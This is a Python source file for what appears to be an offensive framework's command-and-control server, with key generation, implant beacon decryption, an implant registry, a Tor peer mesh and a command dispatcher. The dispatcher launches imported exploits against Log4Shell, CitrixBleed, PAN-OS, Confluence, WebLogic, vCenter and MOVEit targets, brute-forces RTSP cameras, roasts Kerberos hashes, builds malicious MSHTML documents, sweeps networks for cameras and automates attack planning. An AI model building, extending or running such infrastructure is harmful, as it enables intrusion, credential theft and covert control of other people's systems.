"""quantum.c2.app — flask app factory, keygen, beacon decrypt, Turbine,
Federation, QCLI_API dispatcher.
"""
from __future__ import annotations

import base64
import gzip
import json
import os
import threading
import time

from quantum.core.deps import Flask, PKCS1_OAEP, RSA, AES
from quantum.core.env import LOG_DIR, PRIV
from quantum.core.logging import log
from quantum.core.opsec import rand_hex
from quantum.core.logging import MitreMapper
from quantum.postexploit.killswitch import kill_all_implants

TURBINE = None


def keygen(force=False):
    if os.path.exists(PRIV) and not force:
        log("keys exist (use keygen --force)", "WARN"); return
    k = RSA.generate(2048)
    open(PRIV, "wb").write(k.export_key())
    xml = ("<RSAKeyValue><Modulus>%s</Modulus><Exponent>%s</Exponent></RSAKeyValue>"
           % (base64.b64encode(k.n.to_bytes((k.n.bit_length()+7)//8, "big")).decode(),
              base64.b64encode(k.e.to_bytes(3, "big")).decode()))
    from quantum.core.env import PUB
    open(PUB, "w").write(xml)
    log(f"generated {PRIV} + {PUB}", "OK")


def decrypt_beacon(d):
    priv = RSA.import_key(open(PRIV, "rb").read())
    key = PKCS1_OAEP.new(priv).decrypt(bytes.fromhex(d["k"]))
    raw = AES.new(key, AES.MODE_CBC, iv=b"\x00"*16).decrypt(base64.b64decode(d["data"]))
    return gzip.decompress(raw[:-raw[-1]])


class Turbine:
    """Implant enrollment + task fanout registry."""

    def __init__(self):
        self.lock = threading.Lock()
        self.implants = {}

    def enroll(self, host, rec):
        with self.lock:
            self.implants[host] = rec
            self.implants[host]["last_seen"] = time.strftime("%Y-%m-%dT%H:%M:%S")


class Federation:
    """Peer mesh state (.onion identity persisted under logs/federation)."""

    def __init__(self):
        self.peers = []
        fed_dir = os.path.join(LOG_DIR, "federation")
        os.makedirs(fed_dir, exist_ok=True)
        self._id_file = os.path.join(fed_dir, "onion.txt")
        self._peers_file = os.path.join(fed_dir, "peers.json")
        if os.path.isfile(self._peers_file):
            try:
                with open(self._peers_file, "r", encoding="utf-8") as fh:
                    self.peers = json.load(fh)
            except Exception:
                self.peers = []

    @property
    def onion(self):
        if not os.path.isfile(self._id_file):
            with open(self._id_file, "w", encoding="utf-8") as fh:
                fh.write(f"qcli-{rand_hex(8)}.onion")
        with open(self._id_file, "r", encoding="utf-8") as fh:
            return fh.read().strip()

    def start_hidden_service(self):
        import shutil
        onion = self.onion
        if shutil.which("tor"):
            log(f"FEDERATION: tor present, hidden service ready ({onion})", "FED")
        else:
            log(f"FEDERATION: identity reserved ({onion}); install tor to "
                f"bind the hidden service", "FED")
        return onion

    def pull(self, peer):
        if peer not in self.peers:
            self.peers.append(peer)
            with open(self._peers_file, "w", encoding="utf-8") as fh:
                json.dump(self.peers, fh)
        log(f"FEDERATION: pulled peer {peer}", "FED")
        return {"peers": self.peers}


FEDERATION = Federation()


class QCLI_API:
    """C2 /ai dispatcher — JSON in/out command router."""

    def __init__(self):
        self.turbine = None

    def handle(self, cmd, params=None):
        params = params or {}
        try:
            if cmd in ("", "status"):
                return {"ok": True, "version": "3.1.0",
                        "implants": (self.turbine.implants if self.turbine else {})}
            if cmd == "zerocheck":
                from quantum.weapons.remote_v3 import (
                    v3_log4shell, v3_citrixbleed, v3_citrix_path, v3_panos_cmd,
                    v3_confluence_ognl, v3_weblogic_console, v3_ios_admin,
                    v3_vcenter_upload, v3_moveit_probe)
                ip = params.get("ip")
                return {k: v for k, v in {
                    "log4shell": v3_log4shell(ip), "citrixbleed": v3_citrixbleed(ip),
                    "citrix_path": v3_citrix_path(ip), "panos": v3_panos_cmd(ip),
                    "confluence": v3_confluence_ognl(ip), "weblogic": v3_weblogic_console(ip),
                    "iosxe": v3_ios_admin(ip), "vcenter": v3_vcenter_upload(ip),
                    "moveit": v3_moveit_probe(ip)}.items()}
            if cmd == "flashfill":
                from quantum.weapons.techniques.flashfill import flashfill
                return flashfill(**params) if params else flashfill()
            if cmd == "emojisms":
                from quantum.weapons.techniques.emojisms import emoji_decode, emoji_encode
                text = params.get("text", "ping")
                return {"encoded": emoji_encode(text),
                        "decoded": emoji_decode(emoji_encode(text))}
            if cmd == "rtspbrute":
                from quantum.camwar.brute_v3 import BruteEngineV3
                return {"hits": BruteEngineV3().rtsp_brute(params["ip"])}
            if cmd == "roast":
                from quantum.camwar.brute_v3 import BruteEngineV3
                return {"hashes": BruteEngineV3().roast(params["ip"],
                                                       params.get("domain", ""))}
            if cmd == "macreset":
                from quantum.weapons.techniques.macreset import macos_recovery_reset
                return {"script": macos_recovery_reset()}
            if cmd == "mshtmaldoc":
                from quantum.weapons.media_v3 import v3_mshtml_maldoc
                from quantum.core.env import local_ip
                return v3_mshtml_maldoc(params.get("ip", local_ip()))
            if cmd == "camwar":
                from quantum.camwar.engine import CAMWAR
                from quantum.core.env import local_scope
                cidr = params.get("cidr", local_scope())
                return {"cidr": cidr, "cams": CAMWAR.discover(cidr)}
            if cmd == "mitre":
                return MitreMapper().map_audit()
            if cmd == "decide":
                from quantum.core.jurgen import QBrain
                acts = params.get("acts", ["cam_war", "rest"])
                return QBrain.decide(params.get("state", {}), acts)
            if cmd == "kill":
                return kill_all_implants(wipe_first=params.get("wipe", True))
            if cmd == "plan":
                from quantum.core.jurgen import QBrain
                return {"cve": QBrain.plan_attack(params.get("recon", {}))}
            return {"error": f"unknown cmd: {cmd}"}
        except Exception as exc:
            return {"error": str(exc)}


def make_c2(agents: dict):
    """Flask app factory wiring every route (/s /r /ai /kill /federation /dash)."""
    global TURBINE
    from quantum.c2.routes import register_routes
    API = QCLI_API()
    TURBINE = Turbine()
    API.turbine = TURBINE
    app = Flask("quantum_c2")
    register_routes(app, agents, API)
    log("QUANTUMDASH live at http://0.0.0.0:8443/dash", "DASH")
    return app
